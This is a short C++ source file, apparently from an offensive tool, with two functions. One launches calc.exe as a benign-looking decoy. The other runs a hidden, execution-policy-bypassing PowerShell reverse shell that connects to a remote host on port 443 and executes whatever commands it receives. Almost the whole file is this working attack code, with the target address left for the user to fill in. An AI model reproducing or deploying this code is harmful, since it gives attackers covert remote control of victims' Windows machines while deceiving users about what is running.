// ShellOperations.cpp

#include <windows.h>
#include <stdio.h>
#include "ShellOperations.h"

void LaunchCalc() {
    // This function launches calc.exe
    printf("[*] Launching calc.exe to appear benign...\n");
    system("calc.exe");
}

void LaunchReverseShell() {
    // This function launches a reverse shell using PowerShell
    printf("[*] Launching hidden PowerShell reverse shell...\n");

    // PowerShell reverse shell command (adjust IP and port)
    const char* psCommand =
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "$client = New-Object System.Net.Sockets.TCPClient('', 443);"
        "$stream = $client.GetStream();"
        "[byte[]]$buffer = 0..65535|%{0};"
        "while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String);"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte, 0, $sendbyte.Length);"
        "$stream.Flush()};"
        "$client.Close()";

    // Launch PowerShell reverse shell
    system(psCommand);
}
